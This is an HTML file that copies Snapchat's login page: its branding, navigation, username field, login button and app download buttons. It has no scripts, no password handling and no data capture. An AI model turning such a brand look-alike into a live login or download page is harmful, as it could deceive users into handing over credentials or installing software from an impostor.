<!DOCTYPE html>
<html lang="en">
<head>
    
    <title>Snapchat Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <header class="navbar">
        <div class="logo-search">
            <img src="logo.png" alt="Snapchat Logo" class="logo">
            <input type="text" placeholder="Search" class="search-bar">
        </div>
        <div class="nav-links">
            <a href="#"> Stories</a>
            <a href="#"> Spotlight</a>
            <a href="#"> Chat</a>
            <a href="#"> Lenses</a>
        </div>
        <div class="actions">
            <button class="snapchat-ads">Snapchat ads</button>
            <button class="download">Download</button>
        </div>
    </header>
    <div class="container">
        <div class="login-section">
            <h2>Log in to Snapchat</h2>
            <p>Chat, Snap and video call your friends. Watch Stories and Spotlight, all from your computer.</p>
            <form>
                <input type="text" placeholder="Username or email address" required>
                <a href="#" class="phone-number-link">Use phone number instead</a>
                <button type="submit" class="login-button">Log in</button>
            </form>
            <p class="continue-text">or continue with downloading the Snapchat web app</p>
            <button class="download-microsoft">
                <img src="microsoft.png" alt="Get from Microsoft">
            </button>
            <p class="app-link">Looking for the app? <a href="#">Get it here</a>.</p>
        </div>
        <div class="promo-section">
            <img src="promo.jfif" alt="Less Social Media, More Snapchat" class="promo-image">
        </div>
    </div>
</body>
</html>
